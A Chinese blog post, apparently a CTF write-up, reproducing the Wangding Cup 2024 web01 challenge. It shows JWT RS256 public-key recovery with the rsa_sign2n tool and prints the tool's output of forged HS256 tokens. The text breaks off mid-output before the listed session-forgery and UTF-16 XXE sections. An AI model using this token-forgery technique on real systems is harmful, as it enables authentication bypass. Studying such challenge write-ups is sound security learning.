@@ -1,0 +1,819 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    网鼎杯2024青龙组web01复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="这题看着挺有趣的，毕竟我没见过多少web题和crypto一起考的 当然我没报名肯定做不了，结合着题解来做 题目分析题目描述：  进去是一个登录框  没做验证任意可登录，但是admin无法登陆进去 登录进去之后：  除了登出按键，这四个按键对应四个路由： 1234&#x2F;profile&#x2F;game&#x2F;upload&#x2F;view_uploads  profile:  game:  upload:  view_u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2024青龙组web01复现">
+<meta property="og:url" content="http://example.com/2025/06/07/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84web01%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="这题看着挺有趣的，毕竟我没见过多少web题和crypto一起考的 当然我没报名肯定做不了，结合着题解来做 题目分析题目描述：  进去是一个登录框  没做验证任意可登录，但是admin无法登陆进去 登录进去之后：  除了登出按键，这四个按键对应四个路由： 1234&#x2F;profile&#x2F;game&#x2F;upload&#x2F;view_uploads  profile:  game:  upload:  view_u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/20250607183336286.png">
+<meta property="og:image" content="http://example.com/images/20250607183904029.png">
+<meta property="og:image" content="http://example.com/images/20250607183938346.png">
+<meta property="og:image" content="http://example.com/images/20250607184034904.png">
+<meta property="og:image" content="http://example.com/images/20250607184108647.png">
+<meta property="og:image" content="http://example.com/images/20250607184134110.png">
+<meta property="og:image" content="http://example.com/images/20250607184201284.png">
+<meta property="og:image" content="http://example.com/images/20250607184614317.png">
+<meta property="og:image" content="http://example.com/images/20250607184803562.png">
+<meta property="og:image" content="http://example.com/images/20250607185405333.png">
+<meta property="og:image" content="http://example.com/images/20250607185833644.png">
+<meta property="og:image" content="http://example.com/images/20250607190029230.png">
+<meta property="og:image" content="http://example.com/images/20250607190113462.png">
+<meta property="og:image" content="http://example.com/images/20250607190156975.png">
+<meta property="og:image" content="http://example.com/images/20250607190214343.png">
+<meta property="og:image" content="http://example.com/images/20250607190538195.png">
+<meta property="og:image" content="http://example.com/images/20250607191006991.png">
+<meta property="og:image" content="http://example.com/images/20250607191035122.png">
+<meta property="og:image" content="http://example.com/images/20250607191116463.png">
+<meta property="og:image" content="http://example.com/images/20250607191325066.png">
+<meta property="og:image" content="http://example.com/images/20250607191533070.png">
+<meta property="article:published_time" content="2025-06-07T10:32:26.000Z">
+<meta property="article:modified_time" content="2025-06-07T11:22:17.076Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="flask session伪造">
+<meta property="article:tag" content="RS256弱公钥jwt伪造">
+<meta property="article:tag" content="xxe通过utf16绕过黑名单实现任意文件读取">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/20250607183336286.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="网鼎杯2024青龙组web01复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">网鼎杯2024青龙组web01复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt%E5%92%8Csession%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">jwt和session分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt%E5%92%8Csession%E4%BC%AA%E9%80%A0-%E9%87%8D%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">jwt和session伪造(重点)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-RS256-%E5%8A%A0%E5%AF%86%E7%9A%84jwt-%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">伪造 RS256 加密的jwt 实现数据篡改：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0"><span class="toc-number">3.2.</span> <span class="toc-text">session伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-XXE%EF%BC%88utf-16%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">文件上传-XXE（utf-16绕过）</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-网鼎杯2024青龙组web01复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/06/07/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84web01%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-07T10:32:26.000Z" itemprop="datePublished">2025-06-07</time>
+    <time style="display: none;" id="post-update-time">2025-06-07</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>  这题看着挺有趣的，毕竟我没见过多少web题和crypto一起考的</p>
+<p>当然我没报名肯定做不了，结合着题解来做</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目描述：</p>
+<p><img src="/../images/20250607183336286.png" alt="image-20250607183336286"></p>
+<p>进去是一个登录框</p>
+<p><img src="/../images/20250607183904029.png" alt="image-20250607183904029"></p>
+<p>没做验证任意可登录，但是<strong>admin无法登陆进去</strong></p>
+<p>登录进去之后：</p>
+<p><img src="/../images/20250607183938346.png" alt="image-20250607183938346"></p>
+<p>除了登出按键，这四个按键对应四个路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/profile</span><br><span class="line">/game</span><br><span class="line">/upload</span><br><span class="line">/view_uploads</span><br></pre></td></tr></table></figure>
+
+<p><strong>profile:</strong></p>
+<p><img src="/../images/20250607184034904.png" alt="image-20250607184034904"></p>
+<p><strong>game:</strong></p>
+<p><img src="/../images/20250607184108647.png" alt="image-20250607184108647"></p>
+<p><strong>upload:</strong></p>
+<p><img src="/../images/20250607184134110.png" alt="image-20250607184134110"></p>
+<p><strong>view_upload:</strong><br><img src="/../images/20250607184201284.png" alt="image-20250607184201284"></p>
+<h2 id="jwt和session分析"><a href="#jwt和session分析" class="headerlink" title="jwt和session分析"></a>jwt和session分析</h2><p>Cookie中设置了 <code>token</code>(jwt) 和 <code>session</code>(flask session) </p>
+<p>说明一些页面的鉴权代码不同</p>
+<p>发现 view_uploads这里的登录判断的鉴权用的是token(因为这里把token删了直接就提示please login first)</p>
+<p><img src="/../images/20250607184614317.png" alt="image-20250607184614317"></p>
+<p><strong>jwt:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEnYSdhIn0.GBiHbZwxSm1aN80JDGnQfCttdl1JZLI4TrioAEcupGxAP0-jw5tGBPpJ36JQYbGTSlUYtgfYEIDxbR_gcMigJtr3Vbh9SkTmh5iNSVa_UeyNrjRps1b3VkDPxBeoHUWaLh86rfCJ-jyK63cLZcp6piD414Le2AyYJiNG_WC0JcVC;</span><br></pre></td></tr></table></figure>
+
+<p>jwt ：用的RS256加密算法签名，非对称加密算法</p>
+<p><img src="/../images/20250607184803562.png" alt="image-20250607184803562"></p>
+<p><strong>session:</strong></p>
+<p>解码后得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_flashes&#x27;: [(&#x27;success&#x27;, &#x27;Login successful!&#x27;)], &#x27;csrf_token&#x27;:&#x27;9b8d908d58c9ceeafcad20389bcc6f1d6579667b&#x27;, &#x27;role&#x27;: &#x27;guest&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有 <code>role</code>字段 猜测 通过 <code>session</code>控制 <code>role</code> <code>token</code>控制 <code>username</code> 这意味着我们要对 <code>token</code>和 <code>session</code>实现伪造 达到访问后台一些功能的目的</p>
+<h2 id="jwt和session伪造-重点"><a href="#jwt和session伪造-重点" class="headerlink" title="jwt和session伪造(重点)"></a>jwt和session伪造(重点)</h2><h3 id="伪造-RS256-加密的jwt-实现数据篡改："><a href="#伪造-RS256-加密的jwt-实现数据篡改：" class="headerlink" title="伪造 RS256 加密的jwt 实现数据篡改："></a>伪造 <code>RS256</code> 加密的jwt 实现数据篡改：</h3><p>题目部分改编自国际赛 :<a target="_blank" rel="noopener" href="https://berliangabriel.github.io/post/tcp1p-ctf-2023/">https://berliangabriel.github.io/post/tcp1p-ctf-2023/</a> DownUnderCTF 2021 jwt</p>
+<p>RS256非对称加密算法，得要公钥，私钥</p>
+<p><strong>从JWT对中导出 RSA 公钥</strong></p>
+<p><img src="/../images/20250607185405333.png" alt="image-20250607185405333"></p>
+<p>通过 Experimental code to calculate RSA public keys based on two known message-signature pairs 也就是<strong>通过多个JWT尝试恢复RSA公钥</strong></p>
+<p>项目地址 <a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n">silentsignal&#x2F;rsa_sign2n: Deriving RSA public keys from message-signature pairs</a></p>
+<p>这里用两个jwt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\jwt_forgery.py jwt1 jwt2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@2b8f83eac6a2:/app# python jwt_forgery.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEnYSdhIn0.GBiHbZwxSm1aN80JDGnQfCttdl1JZLI4TrioAEcupGxAP0-jw5tGBPpJ36JQYbGTSlUYtgfYEIDxbR_gcMigJtr3Vbh9SkTmh5iNSVa_UeyNrjRps1b3VkDPxBeoHUWaLh86rfCJ-jyK63cLZcp6piD414Le2AyYJiNG_WC0JcVC eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.JHNm0_wvntN4ji0uLjIbgZSDtz3S-BvhCX0GbpajLr5ZPMZcyTmqC6-mZzOGmw9WjbzsIWoAU2noiGyf4OE8nB2l3HZoXLIGWxeSYz2nunBenp8Hzxo5HLT4CqhBp7fhY-6-ueQJHzhiuj5fT-4JNdLFZFt50VfHXsj2pDQvCEZh</span><br><span class="line">[*] GCD:  0x2</span><br><span class="line">[*] GCD:  0x2010a6aeca744df45a605e6db7a2ee0d788dbeb13e438e2370ef791c925b7ee553ddde8ff8832dee178a6ea2abe0d2523053615dcbc539e45552a2e2682ffead2a7b320b8ab6853cf8744bf4fdbe2578eb7c01425cb2a4058ddf2b9ba0f997bee65fc90ea0e82033dc1748803524fd3f99a1a98f982c19d60ac2f0c289abdb5c69a</span><br><span class="line">[+] Found n with multiplier 1  :</span><br><span class="line"> 0x2010a6aeca744df45a605e6db7a2ee0d788dbeb13e438e2370ef791c925b7ee553ddde8ff8832dee178a6ea2abe0d2523053615dcbc539e45552a2e2682ffead2a7b320b8ab6853cf8744bf4fdbe2578eb7c01425cb2a4058ddf2b9ba0f997bee65fc90ea0e82033dc1748803524fd3f99a1a98f982c19d60ac2f0c289abdb5c69a</span><br><span class="line">[+] Written to 2010a6aeca744df4_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.f_a6aZJeisZj-5fL2Ddo8bsDLE7SPVqx3AtrE6074yE&#x27;</span><br><span class="line">[+] Written to 2010a6aeca744df4_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.c1LNmRY92JwyMzLarci45zENURVDgjdkWKwh7K_dBdU&#x27;</span><br><span class="line">[+] Found n with multiplier 2  :</span><br><span class="line"> 0x10085357653a26fa2d302f36dbd17706bc46df589f21c711b877bc8e492dbf72a9eeef47fc4196f70bc5375155f069291829b0aee5e29cf22aa951713417ff56953d9905c55b429e7c3a25fa7edf12bc75be00a12e595202c6ef95cdd07ccbdf732fe48750741019ee0ba4401a927e9fccd0d4c7cc160ceb0561786144d5edae34d</span><br><span class="line">[+] Written to 10085357653a26fa_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.RtnxfBkjMI4bdscMANYbaj1e6NUnmeP7ivLsxy41Jfs&#x27;</span><br><span class="line">[+] Written to 10085357653a26fa_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.14H5k5iJkzv2aavgVix0wm6VjuyBYBd5lbmBSQxsNVM&#x27;</span><br><span class="line">[+] Found n with multiplier 7  :</span><br><span class="line"> 0x494aa18f859c1fe560dc458d117469435cb1b3de452cb29a26b5a71cbc3ed8e79b1fb392380744695a60fce188dd4e72b79a031f889e3b2e79e1744ea4fffcf985abe01a61a1308b5c77890b688e0c821a4002e0d3e176e81fb4f5f6023a7f6b332414b3b8ee00768959ca499e0b676cccdf3a6cc9895fa0189901bca8643e8a16</span><br><span class="line">[+] Written to 494aa18f859c1fe5_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.HlfX0-Ckq_5SXSvblulnlkZTlI2KaS6731XWJHqDIYk&#x27;</span><br><span class="line">[+] Written to 494aa18f859c1fe5_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.jkBe0KRjZ6_TtNW3uQNWzrGsr4Pr2ggWDEAKpWnejqU&#x27;</span><br><span class="line">[+] Found n with multiplier 14  :</span><br><span class="line"> 0x24a550c7c2ce0ff2b06e22c688ba34a1ae58d9ef2296594d135ad38e5e1f6c73cd8fd9c91c03a234ad307e70c46ea7395bcd018fc44f1d973cf0ba27527ffe7cc2d5f00d30d09845ae3bc485b44706410d20017069f0bb740fda7afb011d3fb599920a59dc77003b44ace524cf05b3b6666f9d3664c4afd00c4c80de54321f450b</span><br><span class="line">[+] Written to 24a550c7c2ce0ff2_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.rvVViN0EHtchuMYX0QUclBKFR-WfdlVNYamZLW9bQds&#x27;</span><br><span class="line">[+] Written to 24a550c7c2ce0ff2_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.LuMruqV8CQnxxqhqc0winF75TxxOmls2rz-ngQOmJtI&#x27;</span><br><span class="line">[+] Found n with multiplier 37  :</span><br><span class="line"> 0xdddafdce1ed1aca87f25258f576e37b7266cf0089a0ac2b00678e518b65d6024dc7ba306b76ff1ad9bf526fdb9f7d8b532af9ac051704471023bc0ee0f228f0efc6922e812c554acc4df7552f74d1ef19b9154d212aa7cb0ceae26ccffd3ab36a8a491b15261bc36617e80016fb3d1495765729568f9c783c0145848e8f817412</span><br><span class="line">[+] Written to dddafdce1ed1aca8_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.puJs_mFfBqZuoU7lEI9vf7tJjJILqZFvFzdqt_1GFOw&#x27;</span><br><span class="line">[+] Written to dddafdce1ed1aca8_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.ZPzHChEeiR_G0_gaj3f48NAlCAIEUixa8WlVwYnbzdM&#x27;</span><br><span class="line">[+] Found n with multiplier 74  :</span><br><span class="line"> 0x6eed7ee70f68d6543f9292c7abb71bdb933678044d056158033c728c5b2eb0126e3dd1835bb7f8d6cdfa937edcfbec5a9957cd6028b82238811de077079147877e3491740962aa56626fbaa97ba68f78cdc8aa6909553e58675713667fe9d59b545248d8a930de1b30bf4000b7d9e8a4abb2b94ab47ce3c1e00a2c24747c0ba09</span><br><span class="line">[+] Written to 6eed7ee70f68d654_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.SKx5l-8vwmRRmq4CPZ2xU74SwPf8Lc-6ld_igESOWSE&#x27;</span><br><span class="line">[+] Written to 6eed7ee70f68d654_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.0lhQCbytTM-X4WS63btIsNYSKqT5Pc__3dn3Tz-cWtQ&#x27;</span><br><span class="line">================================================================================</span><br><span class="line">Here are your JWT&#x27;s once again for your copypasting pleasure</span><br><span class="line">================================================================================</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.f_a6aZJeisZj-5fL2Ddo8bsDLE7SPVqx3AtrE6074yE</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.c1LNmRY92JwyMzLarci45zENURVDgjdkWKwh7K_dBdU</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.RtnxfBkjMI4bdscMANYbaj1e6NUnmeP7ivLsxy41Jfs</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.14H5k5iJkzv2aavgVix0wm6VjuyBYBd5lbmBSQxsNVM</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhJ2EnYSIsICJleHAiOiAxNzMwMjkwMzk2fQ.HlfX0-Ckq_5SXSvblulnlkZTlI2KaS6731XWJHqDIYk</span><br><span 